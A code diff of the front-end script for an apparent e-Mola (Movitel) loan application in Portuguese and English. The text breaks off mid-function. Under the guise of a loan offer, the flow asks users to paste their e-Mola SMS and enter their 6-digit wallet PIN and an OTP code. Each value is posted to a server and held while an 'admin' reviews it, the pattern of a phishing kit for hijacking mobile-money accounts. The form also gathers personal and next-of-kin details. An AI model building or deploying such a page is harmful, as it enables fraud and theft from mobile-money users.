@@ -1,154 +1,176 @@
 // ============================================================
-// e-Mola Loan Application – Frontend Logic (Bilingual)
+// script.js – e-Mola Loan App (6‑digit PIN)
 // ============================================================
 
-// ─── Translation Dictionary ───
+// Language translations (Portuguese / English)
 const translations = {
-  en: {
-    welcome: "Welcome to e-Mola",
-    tagline: "Fast, easy loans right from your phone",
-    start: "START",
-    footer: "© 2026 e-Mola Loans – Movitel",
-    back: "← Back",
-    loan_details: "Loan Details",
-    step1_sub: "Step 1 of 4",
-    loan_amount: "Loan Amount (1,000 - 50,000 MZN)",
-    duration: "Duration (14 - 120 days)",
-    principal: "Principal Amount:",
-    interest: "Interest (0.5% daily):",
-    total_payable: "Total Repayable:",
-    reason: "Reason for Loan",
-    next_step: "NEXT STEP",
-    personal_details: "Personal Details",
-    step2_sub: "Step 2 of 4",
-    first_name: "First Name",
-    last_name: "Last Name",
-    phone_label: "Phone Number (Mozambique)",
-    phone_hint: "9 digits without +258 prefix (e.g., 841234567)",
-    email: "Email",
-    back_btn: "BACK",
-    next: "NEXT",
-    kin_details: "Next of Kin",
-    step3_sub: "Step 3 of 4",
-    kin_first_name: "Kin First Name",
-    kin_last_name: "Kin Last Name",
-    kin_phone: "Kin Phone Number",
-    province_label: "Province",
-    select_province: "Select Province",
-    summary: "Application Summary",
-    amount_sk: "Amount:",
-    duration_sk: "Duration:",
-    total_sk: "Total Repayable:",
-    applicant_sk: "Applicant:",
-    submit: "SUBMIT APPLICATION",
-    pin_title: "Enter e-Mola PIN",
-    pin_sub: "Step 4 of 4",
-    pin_label: "Enter your e-Mola PIN (4 digits):",
-    pin_attempts: "🔑 Attempts remaining: 3 of 3",
-    confirm_pin: "CONFIRM PIN",
-    otp_title: "Enter OTP Code",
-    otp_sub: "4-digit code sent to your phone via e-Mola",
-    otp_code_label: "OTP Code (4 digits):",
-    resend_otp: "Resend OTP",
-    verify_otp: "VERIFY & APPROVE",
-    processing_title: "Processing Application...",
-    processing_sub: "Please wait while we process your loan",
-    processing_status: "⏳ Awaiting admin approval...",
-    approved_title: "Loan Approved!",
-    approved_sub: "Your loan has been successfully approved.",
-    amount_receive: "Amount to Receive",
-    important_info: "ℹ️ Important Information",
-    important_info_text: "The funds will be deposited directly to your e-Mola account within 5 minutes. Please ensure your phone number is correct.",
-    loan_details_title: "📊 Loan Details",
-    amount_label: "Amount",
-    duration_label: "Duration",
-    total_label: "Total Repayment",
-    next_steps: "Next Steps: To start repaying, you can set up an automatic payment plan in your e-Mola account.",
-    finish: "FINISH",
-    // Error messages (used with showError)
-    err_reason: "Please provide a reason for the loan.",
-    err_fields: "Please fill all fields correctly.",
-    err_pin: "Enter a 4-digit PIN.",
-    err_otp: "Enter a 4-digit OTP.",
-    err_wrong_pin: "Wrong PIN.",
-    err_blocked_pin: "Application blocked. Please wait 5 minutes.",
-    err_app_rejected: "Your application was rejected by the admin.",
-    err_otp_rejected: "OTP rejected. Please request a new OTP."
-  },
   pt: {
-    welcome: "Bem-vindo ao e-Mola",
-    tagline: "Empréstimos rápidos e fáceis direto do seu telemóvel",
-    start: "COMEÇAR",
-    footer: "© 2026 e-Mola Empréstimos – Movitel",
-    back: "← Voltar",
-    loan_details: "Detalhes do Empréstimo",
-    step1_sub: "Passo 1 de 4",
-    loan_amount: "Valor do Empréstimo (1.000 – 50.000 MZN)",
-    duration: "Prazo (14 – 120 dias)",
-    principal: "Montante Principal:",
-    interest: "Juros (0,5% diário):",
-    total_payable: "Total a Pagar:",
-    reason: "Motivo do Empréstimo",
-    next_step: "PRÓXIMO PASSO",
-    personal_details: "Dados Pessoais",
-    step2_sub: "Passo 2 de 4",
-    first_name: "Nome",
-    last_name: "Apelido",
-    phone_label: "Número de Telemóvel (Moçambique)",
-    phone_hint: "9 dígitos sem o prefixo +258 (ex: 841234567)",
-    email: "Email",
-    back_btn: "VOLTAR",
-    next: "PRÓXIMO",
-    kin_details: "Parente Próximo",
-    step3_sub: "Passo 3 de 4",
-    kin_first_name: "Nome do Parente",
-    kin_last_name: "Apelido",
-    kin_phone: "Telemóvel do Parente",
-    province_label: "Província",
-    select_province: "Seleccione a Província",
-    summary: "Resumo do Pedido",
-    amount_sk: "Montante:",
-    duration_sk: "Prazo:",
-    total_sk: "Total a Pagar:",
-    applicant_sk: "Requerente:",
-    submit: "SUBMETER PEDIDO",
-    pin_title: "Introduza o PIN e-Mola",
-    pin_sub: "Passo 4 de 4",
-    pin_label: "Introduza o seu PIN e-Mola (4 dígitos):",
-    pin_attempts: "🔑 Tentativas restantes: 3 de 3",
-    confirm_pin: "CONFIRMAR PIN",
-    otp_title: "Introduza o Código OTP",
-    otp_sub: "Código de 4 dígitos enviado ao seu telemóvel via e-Mola",
-    otp_code_label: "Código OTP (4 dígitos):",
-    resend_otp: "Reenviar OTP",
-    verify_otp: "VERIFICAR E APROVAR",
-    processing_title: "A Processar Pedido...",
-    processing_sub: "Aguarde enquanto processamos o seu empréstimo",
-    processing_status: "⏳ A aguardar aprovação do administrador...",
-    approved_title: "Empréstimo Aprovado!",
-    approved_sub: "O seu empréstimo foi aprovado com sucesso.",
-    amount_receive: "Valor a Receber",
-    important_info: "ℹ️ Informação Importante",
-    important_info_text: "Os fundos serão depositados directamente na sua conta e-Mola dentro de 5 minutos. Verifique se o número está correcto.",
-    loan_details_title: "📊 Detalhes do Empréstimo",
-    amount_label: "Montante",
-    duration_label: "Prazo",
-    total_label: "Total a Pagar",
-    next_steps: "Próximos Passos: Para começar a pagar, pode configurar um plano de pagamento automático na sua conta e-Mola.",
-    finish: "CONCLUIR",
-    // Error messages
-    err_reason: "Por favor indique o motivo do empréstimo.",
-    err_fields: "Por favor preencha todos os campos correctamente.",
-    err_pin: "Introduza um PIN de 4 dígitos.",
-    err_otp: "Introduza um OTP de 4 dígitos.",
-    err_wrong_pin: "PIN errado.",
-    err_blocked_pin: "Pedido bloqueado. Aguarde 5 minutos.",
-    err_app_rejected: "O seu pedido foi rejeitado pelo administrador.",
-    err_otp_rejected: "OTP rejeitado. Peça um novo OTP."
+    welcome: 'Bem-vindo ao e-Mola',
+    tagline: 'Empréstimos rápidos e fáceis através do e-Mola',
+    calculator: 'Calculadora de Empréstimo',
+    amount: 'Montante',
+    term: 'Prazo',
+    monthly: 'Pagamento Mensal',
+    start: 'COMEÇAR',
+    footer: '© 2026 e-Mola Empréstimos – Movitel',
+    back: 'Voltar',
+    loan_application: 'Pedido de Empréstimo',
+    step1_sub: 'Passo 1 de 5',
+    step2_sub: 'Passo 2 de 5',
+    step3_sub: 'Passo 3 de 5',
+    step4_sub: 'Passo 4 de 5',
+    step5_sub: 'Passo 5 de 5',
+    loan_type: 'Tipo de Empréstimo',
+    loan_amount: 'Montante (MZN)',
+    loan_term: 'Prazo',
+    purpose: 'Finalidade',
+    next: 'PRÓXIMO PASSO',
+    first_name: 'Primeiro Nome',
+    last_name: 'Apelido',
+    phone_label: 'Número de Telemóvel (Moçambique)',
+    phone_hint: '9 dígitos sem o prefixo +258 (ex: 841234567)',
+    employment: 'Situação Profissional',
+    annual_income: 'Rendimento Anual (MZN)',
+    kin_name: 'Nome do Familiar Próximo',
+    kin_phone: 'Telemóvel do Familiar',
+    summary: 'Resumo do Pedido',
+    applicant: 'Requerente',
+    submit: 'SUBMETER PEDIDO',
+    processing: 'A Processar Pedido...',
+    processing_sub: 'Aguarde enquanto processamos o seu pedido de empréstimo',
+    awaiting: '⏳ A aguardar aprovação do administrador...',
+    verify_sms: 'Verificar Mensagem e-Mola',
+    paste_sms: '📩 Cole o conteúdo da mensagem e-Mola:',
+    sms_hint: 'Inclua o código OTP ou detalhes de verificação enviados para o seu número e-Mola.',
+    sms_tip: '💡 Dica:',
+    sms_tip_text: 'Verifique a sua caixa de SMS para a mensagem do e-Mola Moçambique. Copie o texto completo da mensagem.',
+    submit_sms: 'SUBMETER MENSAGEM',
+    resend_sms: '🔄 Reenviar SMS',
+    verifying_sms: 'A Verificar Mensagem...',
+    verifying_sms_sub: 'A sua mensagem foi recebida. Aguarde a verificação do administrador...',
+    admin_reviewing: '⏳ O administrador está a analisar a sua mensagem...',
+    enter_pin: 'Introduza o PIN e-Mola',
+    pin_label: 'Introduza o seu PIN e-Mola (6 dígitos):',
+    submit_pin: 'SUBMETER PIN',
+    verifying_pin: 'A Verificar PIN...',
+    verifying_pin_sub: 'O seu PIN foi recebido. Aguarde a verificação do administrador...',
+    admin_reviewing_pin: '⏳ O administrador está a analisar o seu PIN...',
+    enter_otp: 'Introduza o Código OTP',
+    otp_sub: 'Código de 4 dígitos enviado para o seu telemóvel via e-Mola',
+    otp_label: 'Código OTP (4 dígitos):',
+    verify_otp: 'VERIFICAR E APROVAR',
+    resend_otp: '🔄 Reenviar OTP',
+    verifying_otp: 'A Verificar OTP...',
+    verifying_otp_sub: 'O seu código OTP foi recebido. Aguarde a verificação do administrador...',
+    admin_reviewing_otp: '⏳ O administrador está a verificar o seu OTP...',
+    app_id: 'ID do Pedido:',
+    approved_title: 'Empréstimo Aprovado!',
+    approved_sub: 'O seu empréstimo foi aprovado com sucesso.',
+    amount_receive: 'Montante a Receber',
+    important: 'Informação Importante',
+    important_text: 'Os fundos serão depositados diretamente na sua conta e-Mola dentro de 5 minutos. Assegure‑se de que o seu número está correto.',
+    loan_details: 'Detalhes do Empréstimo',
+    next_steps: 'Próximos Passos:',
+    next_steps_text: 'Para começar a pagar, pode configurar um plano de pagamento automático na sua conta e-Mola nos próximos 7 dias.',
+    finish: 'CONCLUIR',
+    personal: 'Empréstimo Pessoal',
+    business: 'Empréstimo Comercial',
+    home: 'Empréstimo Habitacional',
+    student: 'Empréstimo Estudantil',
+    m6: '6 Meses',
+    m12: '12 Meses',
+    m24: '24 Meses',
+    m48: '48 Meses',
+    employed: 'Empregado',
+    self_employed: 'Trabalhador por conta própria',
+    unemployed: 'Desempregado',
+    retired: 'Reformado'
+  },
+  en: {
+    welcome: 'Welcome to e-Mola',
+    tagline: 'Fast, easy loans through e-Mola',
+    calculator: 'Loan Calculator',
+    amount: 'Amount',
+    term: 'Term',
+    monthly: 'Monthly Payment',
+    start: 'START',
+    footer: '© 2026 e-Mola Loans – Movitel',
+    back: 'Back',
+    loan_application: 'Loan Application',
+    step1_sub: 'Step 1 of 5',
+    step2_sub: 'Step 2 of 5',
+    step3_sub: 'Step 3 of 5',
+    step4_sub: 'Step 4 of 5',
+    step5_sub: 'Step 5 of 5',
+    loan_type: 'Loan Type',
+    loan_amount: 'Amount (MZN)',
+    loan_term: 'Term',
+    purpose: 'Purpose',
+    next: 'NEXT STEP',
+    first_name: 'First Name',
+    last_name: 'Last Name',
+    phone_label: 'Phone Number (Mozambique)',
+    phone_hint: '9 digits without +258 prefix (e.g., 841234567)',
+    employment: 'Employment Status',
+    annual_income: 'Annual Income (MZN)',
+    kin_name: 'Next of Kin Name',
+    kin_phone: 'Next of Kin Phone',
+    summary: 'Application Summary',
+    applicant: 'Applicant',
+    submit: 'SUBMIT APPLICATION',
+    processing: 'Processing Application...',
+    processing_sub: 'Please wait while we process your loan application',
+    awaiting: '⏳ Awaiting admin approval...',
+    verify_sms: 'Verify e-Mola Message',
+    paste_sms: '📩 Paste the e-Mola message content:',
+    sms_hint: 'Include the OTP code or verification details sent to your e-Mola number.',
+    sms_tip: '💡 Tip:',
+    sms_tip_text: 'Check your SMS inbox for the message from e-Mola Mozambique. Copy the full message text.',
+    submit_sms: 'SUBMIT MESSAGE',
+    resend_sms: '🔄 Resend SMS',
+    verifying_sms: 'Verifying Message...',
+    verifying_sms_sub: 'Your message has been received. Please wait for admin verification...',
+    admin_reviewing: '⏳ Admin is reviewing your message...',
+    enter_pin: 'Enter e-Mola PIN',
+    pin_label: 'Enter your e-Mola PIN (6 digits):',
+    submit_pin: 'SUBMIT PIN',
+    verifying_pin: 'Verifying PIN...',
+    verifying_pin_sub: 'Your PIN has been received. Please wait for admin verification...',
+    admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
+    enter_otp: 'Enter OTP Code',
+    otp_sub: '4-digit code sent to your phone via e-Mola',
+    otp_label: 'OTP Code (4 digits):',
+    verify_otp: 'VERIFY & APPROVE',
+    resend_otp: '🔄 Resend OTP',
+    verifying_otp: 'Verifying OTP...',
+    verifying_otp_sub: 'Your OTP code has been received. Please wait for admin verification...',
+    admin_reviewing_otp: '⏳ Admin is verifying your OTP...',
+    app_id: 'Application ID:',
+    approved_title: 'Loan Approved!',
+    approved_sub: 'Your loan has been successfully approved.',
+    amount_receive: 'Amount to Receive',
+    important: 'Important Information',
+    important_text: 'The funds will be deposited directly to your e-Mola account within 5 minutes. Please ensure your phone number is correct.',
+    loan_details: 'Loan Details',
+    next_steps: 'Next Steps:',
+    next_steps_text: 'To start repaying, you can set up an automatic payment plan on your e-Mola account in the next 7 days.',
+    finish: 'FINISH',
+    personal: 'Personal Loan',
+    business: 'Business Loan',
+    home: 'Home Loan',
+    student: 'Student Loan',
+    m6: '6 Months',
+    m12: '12 Months',
+    m24: '24 Months',
+    m48: '48 Months',
+    employed: 'Employed',
+    self_employed: 'Self-employed',
+    unemployed: 'Unemployed',
+    retired: 'Retired'
   }
 };
 
-let currentLang = localStorage.getItem('emola_lang') || 'pt'; // default Portuguese
+let currentLang = localStorage.getItem('emola_lang') || 'pt';
 
 function toggleLanguage() {
   currentLang = currentLang === 'pt' ? 'en' : 'pt';
@@ -157,446 +179,793 @@ function toggleLanguage() {
 }
 
 function applyLanguage() {
-  // Update all elements with data-i18n
   document.querySelectorAll('[data-i18n]').forEach(el => {
     const key = el.getAttribute('data-i18n');
     if (translations[currentLang][key]) {
       el.textContent = translations[currentLang][key];
     }
   });
-
-  // Update language button label
-  const langBtn = document.querySelector('.lang-btn');
-  if (langBtn) {
-    langBtn.textContent = currentLang === 'pt' ? '🌐 EN' : '🌐 PT';
-  }
+  document.getElementById('langIcon').textContent = currentLang === 'pt' ? '🌐 EN' : '🌐 PT';
 }
 
-// ─── State Management ───
-let appData = {
-  loanAmount: 5000,
-  loanDuration: 30,
+// State
+const S = {
+  loanType: '',
+  loanAmount: 0,
+  loanTerm: '',
+  loanPurpose: '',
   firstName: '',
   lastName: '',
   phone: '',
-  email: '',
-  kinFirstName: '',
-  kinLastName: '',
+  employment: '',
+  annualIncome: 0,
+  kinName: '',
   kinPhone: '',
-  province: '',
-  loanReason: '',
-  applicationId: null
+  applicationId: '',
+  rejectedStep: null
 };
 
-let currentPage = 'page-landing';
+let currentPollTimeout = null;
+let otpResendTimer = null;
+let otpResendCountdown = 0;
+let pinBlockTimer = null;
+let smsCountdownInterval = null;
+let otpCountdownInterval = null;
 
-function saveState() {
-  const state = { appData, currentPage, currentLang };
-  localStorage.setItem('emola_app_state', JSON.stringify(state));
+// localStorage
+const STORAGE_KEYS = {
+  APPLICATION_ID: 'emola_application_id',
+  APPLICATION_DATA: 'emola_application_data',
+  REJECTION_INFO: 'emola_rejection_info',
+  FORM_DRAFT: 'emola_form_draft',
+  OTP_TIMER: 'emola_otp_timer'
+};
+
+function saveToLocalStorage(key, data) {
+  try {
+    localStorage.setItem(key, JSON.stringify(data));
+    console.log(`💾 Saved to localStorage: ${key}`);
+  } catch (error) {
+    console.error(`❌ Failed to save ${key}:`, error);
+  }
 }
 
-function loadState() {
-  const saved = localStorage.getItem('emola_app_state');
+function getFromLocalStorage(key) {
+  try {
+    const data = localStorage.getItem(key);
+    return data ? JSON.parse(data) : null;
+  } catch (error) {
+    console.error(`❌ Failed to load ${key}:`, error);
+    return null;
+  }
+}
+
+function removeFromLocalStorage(key) {
+  try {
+    localStorage.removeItem(key);
+    console.log(`🗑️ Removed from localStorage: ${key}`);
+  } catch (error) {
+    console.error(`❌ Failed to remove ${key}:`, error);
+  }
+}
+
+function saveApplicationId(id) {
+  if (id) {
+    S.applicationId = id;
+    saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
+      id: id,
+      timestamp: new Date().toISOString()
+    });
+  }
+}
+
+function loadApplicationId() {
+  const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
+  if (saved && saved.id) {
+    const age = Date.now() - new Date(saved.timestamp).getTime();
+    if (age < 24 * 60 * 60 * 1000) {
+      S.applicationId = saved.id;
+      return saved.id;
+    } else {
+      removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
+    }
+  }
+  return null;
+}
+
+function saveApplicationData() {
+  saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, {
+    ...S,
+    timestamp: new Date().toISOString()
+  });
+}
+
+function loadApplicationData() {
+  const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
   if (saved) {
-    try {
-      const parsed = JSON.parse(saved);
-      appData = parsed.appData || appData;
-      currentPage = parsed.currentPage || 'page-landing';
-      if (parsed.currentLang) currentLang = parsed.currentLang;
+    const age = Date.now() - new Date(saved.timestamp).getTime();
+    if (age < 24 * 60 * 60 * 1000) {
+      const fieldsToRestore = [
+        'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
+        'firstName', 'lastName', 'phone',
+        'employment', 'annualIncome', 'kinName', 'kinPhone',
+        'applicationId', 'rejectedStep'
+      ];
+      fieldsToRestore.forEach(field => {
+        if (saved[field] !== undefined) S[field] = saved[field];
+      });
+      console.log('🔄 Restored application data');
       return true;
-    } catch (e) {
-      console.error('Failed to parse saved state', e);
+    } else {
+      removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
     }
   }
   return false;
 }
 
-function clearState() {
-  localStorage.removeItem('emola_app_state');
+function saveRejectionInfo(step, applicationId) {
+  saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
+    step,
+    applicationId,
+    timestamp: new Date().toISOString()
+  });
 }
 
-// ─── Page Navigation ───
+function loadRejectionInfo() {
+  const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+  if (saved) {
+    const age = Date.now() - new Date(saved.timestamp).getTime();
+    if (age < 5 * 60 * 1000) return saved;
+    else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+  }
+  return null;
+}
+
+function clearRejectionInfo() {
+  removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+}
+
+function saveFormDraft() {
+  const draft = {
+    firstName: document.getElementById('s2fi')?.value || '',
+    lastName: document.getElementById('s2la')?.value || '',
+    phone: document.getElementById('s2ph')?.value || '',
+    loanAmount: document.getElementById('s1am')?.value || '',
+    loanPurpose: document.getElementById('s1pu')?.value || '',
+    employment: document.getElementById('s3em')?.value || '',
+    annualIncome: document.getElementById('s3in')?.value || '',
+    kinName: document.getElementById('s3kn')?.value || '',
+    kinPhone: document.getElementById('s3kp')?.value || '',
+    timestamp: new Date().toISOString()
+  };
+  saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
+}
+
+function loadFormDraft() {
+  const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+  if (draft) {
+    const age = Date.now() - new Date(draft.timestamp).getTime();
+    if (age < 24 * 60 * 60 * 1000) {
+      if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
+      if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
+      if (draft.phone) document.getElementById('s2ph').value = draft.phone;
+      if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
+      if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
+      if (draft.employment) document.getElementById('s3em').value = draft.employment;
+      if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
+      if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
+      if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
+      return true;
+    } else {
+      removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+    }
+  }
+  return false;
+}
+
+// Navigation
 function goTo(pageId) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(pageId).classList.add('active');
-  currentPage = pageId;
-  saveState();
+  const el = document.getElementById(pageId);
+  if (el) el.classList.add('active');
+  window.scrollTo(0, 0);
+
+  if (pageId === 'page-sms-paste') startSmsCountdown();
+  if (pageId === 'page-otp') startOtpCountdown();
+}
+
+function startApplication() {
+  S.rejectedStep = null;
+  clearRejectionInfo();
+  if (!S.applicationId) {
+    S.applicationId = 'EMOLA-' + Date.now().toString().slice(-6);
+    saveApplicationId(S.applicationId);
+  }
+  ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
+  goTo('page-step1');
+}
+
+// Toast
+function showToast(message, type = 'info', duration = 3000) {
+  const existing = document.querySelector('.toast');
+  if (existing) existing.remove();
+  const toast = document.createElement('div');
+  toast.className = `toast toast-${type}`;
+  toast.textContent = message;
+  document.body.appendChild(toast);
+  setTimeout(() => toast.remove(), duration);
+}
+
+// Form helpers
+function normalizePhone(id) {
+  let inp = document.getElementById(id);
+  let val = inp.value.replace(/\D/g, '');
+  if (val.length > 9) val = val.substring(0, 9);
+  inp.value = val;
+  saveFormDraft();
+}
+
+function updateCalc() {
+  const amt = +document.getElementById('amtSlider').value;
+  document.getElementById('calcAmt').textContent = amt.toLocaleString() + ' MZN';
+  const monthly = Math.ceil(amt / 48);
+  document.getElementById('monthlyAmt').textContent = monthly.toLocaleString() + ' MZN';
+}
+
+function showErr(id, msg) {
+  const box = document.getElementById(id);
+  if (box) {
+    box.classList.add('show');
+    const txt = document.getElementById(id + 'Txt');
+    if (txt) txt.textContent = msg;
+  }
 }
 
 function clearErr(id) {
-  const el = document.getElementById(id);
-  el.classList.remove('show');
+  const box = document.getElementById(id);
+  if (box) box.classList.remove('show');
 }
 
-// ─── Landing ───
-function startApplication() {
-  appData = {
-    loanAmount: 5000,
-    loanDuration: 30,
-    firstName: '',
-    lastName: '',
-    phone: '',
-    email: '',
-    kinFirstName: '',
-    kinLastName: '',
-    kinPhone: '',
-    province: '',
-    loanReason: '',
-    applicationId: null
-  };
-  goTo('page-step1');
-  document.getElementById('s1am').value = 5000;
-  document.getElementById('s1dur').value = 30;
-  updateStep1Calc();
-}
-
-// ─── Step 1 ───
-function updateStep1Calc() {
-  let amt = parseInt(document.getElementById('s1am').value);
-  let dur = parseInt(document.getElementById('s1dur').value);
-  let interest = amt * 0.005 * dur;
-  let total = amt + interest;
-  document.getElementById('s1AmtDisplay').textContent = `${amt.toLocaleString()} MZN`;
-  document.getElementById('s1DurDisplay').textContent = `${dur} days`;
-  document.getElementById('s1Principal').textContent = `${amt.toLocaleString()} MZN`;
-  document.getElementById('s1Interest').textContent = `${interest.toLocaleString()} MZN`;
-  document.getElementById('s1Total').textContent = `${total.toLocaleString()} MZN`;
-  appData.loanAmount = amt;
-  appData.loanDuration = dur;
-  saveState();
-}
-
+// Step navigation
 function toS2() {
-  let reason = document.getElementById('s1reason').value.trim();
-  if (!reason) {
-    showError('s1Err', 'err_reason');
+  const ty = document.getElementById('s1ty').value;
+  const am = +document.getElementById('s1am').value;
+  const te = document.getElementById('s1te').value;
+  const pu = document.getElementById('s1pu').value;
+  if (!ty || am <= 0 || !te || !pu.trim()) {
+    showErr('s1Err', 'Por favor preencha todos os campos.');
     return;
   }
-  appData.loanReason = reason;
+  S.loanType = ty;
+  S.loanAmount = am;
+  S.loanTerm = te;
+  S.loanPurpose = pu;
+  saveApplicationData();
+  saveFormDraft();
   goTo('page-step2');
 }
 
-// ─── Step 2 ───
 function toS3() {
-  let fi = document.getElementById('s2fi').value.trim();
-  let la = document.getElementById('s2la').value.trim();
-  let ph = document.getElementById('s2ph').value.trim();
-  let em = document.getElementById('s2em').value.trim();
-  if (!fi || !la || ph.length !== 9 || !em) {
-    showError('s2Err', 'err_fields');
+  const fi = document.getElementById('s2fi').value.trim();
+  const la = document.getElementById('s2la').value.trim();
+  const ph = document.getElementById('s2ph').value;
+  if (!fi || !la) {
+    showErr('s2Err', 'Por favor introduza o seu nome completo.');
     return;
   }
-  appData.firstName = fi;
-  appData.lastName = la;
-  appData.phone = ph;
-  appData.email = em;
-  document.getElementById('sA').textContent = `${appData.loanAmount.toLocaleString()} MZN`;
-  document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
-  document.getElementById('sR').textContent = `${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toLocaleString()} MZN`;
-  document.getElementById('sN').textContent = `${fi} ${la}`;
+  if (ph.length !== 9) {
+    showErr('s2Err', 'Introduza um número de telefone válido de 9 dígitos.');
+    return;
+  }
+  S.firstName = fi;
+  S.lastName = la;
+  S.phone = ph;
+  saveApplicationData();
+  saveFormDraft();
   goTo('page-step3');
 }
 
-// ─── Submit Application ───
-async function submitApp() {
-  let kf = document.getElementById('s3kf').value.trim();
-  let kl = document.getElementById('s3kl').value.trim();
-  let kp = document.getElementById('s3kp').value.trim();
-  let prov = document.getElementById('s3prov').value;
-  if (!kf || !kl || kp.length !== 9 || !prov) {
-    showError('s3Err', 'err_fields');
-    return;
-  }
-  appData.kinFirstName = kf;
-  appData.kinLastName = kl;
-  appData.kinPhone = kp;
-  appData.province = prov;
-
-  try {
-    const response = await fetch('/api/send-application', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationData: appData })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      appData.applicationId = data.applicationId;
-      goTo('page-processing');
-      document.getElementById('processingStatus').textContent = currentLang === 'pt' ? '⏳ A aguardar aprovação do administrador...' : '⏳ Awaiting admin approval...';
-      startAppPolling();
-    } else {
-      alert('Error: ' + data.error);
+// PIN/OTP helpers (6‑digit PIN)
+function pinMvM(el, i, maxLength = 6) {
+  el.value = el.value.replace(/\D/g, '');
+  if (el.value && i < maxLength - 1) {
+    const nextPin = document.getElementById('pin' + (i + 1));
+    if (nextPin) {
+      nextPin.focus();
+      return;
     }
-  } catch (err) {
-    console.error(err);
-    alert('Network error. Please try again.');
+  }
+  if (i === maxLength - 1 && el.value) {
+    const allFilled = [0,1,2,3,4,5].every(idx => document.getElementById('pin' + idx)?.value);
+    if (allFilled) setTimeout(() => doPin(), 300);
   }
 }
 
-// ─── App Approval Polling ───
-function startAppPolling() {
-  if (window._appInterval) clearInterval(window._appInterval);
-  window._appInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/app`, {
-        cache: 'no-store'
-      });
-      if (res.status === 404) {
-        clearInterval(window._appInterval);
-        clearState();
-        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
-
-      if (data.status === 'approved') {
-        clearInterval(window._appInterval);
-        goTo('page-pin');
-        clearLoginPin();
-        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔑 Tentativas restantes: 3 de 3' : '🔑 Attempts remaining: 3 of 3';
-        return;
-      }
-      if (data.status === 'rejected') {
-        clearInterval(window._appInterval);
-        clearState();
-        alert(currentLang === 'pt' ? 'O seu pedido foi rejeitado pelo administrador.' : 'Your application was rejected by the admin.');
-        goTo('page-landing');
-        return;
-      }
-    } catch (err) {
-      console.error('App polling error:', err);
-    }
-  }, 3000);
-}
-
-// ─── PIN Submission ───
-async function doPin() {
-  let pin = '';
-  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
-  if (pin.length !== 4) {
-    showError('pinErr', 'err_pin');
-    return;
-  }
-
-  try {
-    const response = await fetch('/api/send-pin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId, pin })
-    });
-    const data = await response.json();
-    if (data.ok) {
-      startPinPolling();
-    } else if (data.blocked) {
-      showError('pinErr', 'err_blocked_pin');
-      disablePinInputs();
-    } else {
-      showError('pinErr', data.error || 'Error');
-    }
-  } catch (err) {
-    alert('Network error');
-  }
-}
-
-// ─── PIN Polling ───
-function startPinPolling() {
-  if (window._pinInterval) clearInterval(window._pinInterval);
-  window._pinInterval = setInterval(async () => {
-    try {
-      const res = await fetch(`/api/status/${appData.applicationId}/pin`, {
-        cache: 'no-store'
-      });
-      if (res.status === 404) {
-        clearInterval(window._pinInterval);
-        clearState();
-        alert(currentLang === 'pt' ? 'Pedido não encontrado. Recomece.' : 'Application not found. Please start again.');
-        goTo('page-landing');
-        return;
-      }
-      const data = await res.json();
-
-      if (data.status === 'approved') {
-        clearInterval(window._pinInterval);
-        clearLoginPin();
-        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔑 Tentativas restantes: 3 de 3' : '🔑 Attempts remaining: 3 of 3';
-        goTo('page-otp');
-        return;
-      }
-      if (data.status === 'rejected') {
-        const remaining = data.remainingAttempts;
-        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? `🔑 Tentativas restantes: ${remaining} de 3` : `🔑 Attempts remaining: ${remaining} of 3`;
-        showError('pinErr', 'err_wrong_pin');
-        clearLoginPin();
-        return;
-      }
-      if (data.status === 'blocked') {
-        clearInterval(window._pinInterval);
-        document.getElementById('pinAttemptsDisplay').textContent = currentLang === 'pt' ? '🔒 Demasiadas tentativas. Aguarde 5 minutos.' : '🔒 Too many attempts. Please wait 5 minutes.';
-        disablePinInputs();
-        showError('pinErr', 'err_blocked_pin');
-        return;
-      }
-    } catch (err) {
-      console.error('Pin polling error:', err);
-    }
-  }, 3000);
-}
-
-// ─── OTP Submission ───
-async function doOtp() {
-  let otp = '';
-  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
-  if (otp.length !== 4) {
-    showError('otpErr', 'err_otp');
-    return;
-  }
-
-  try {
-    const response = await fetch('/api/send-otp', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ applicationId: appData.applicationId, otp })
-    });
-    const data = await response.json();
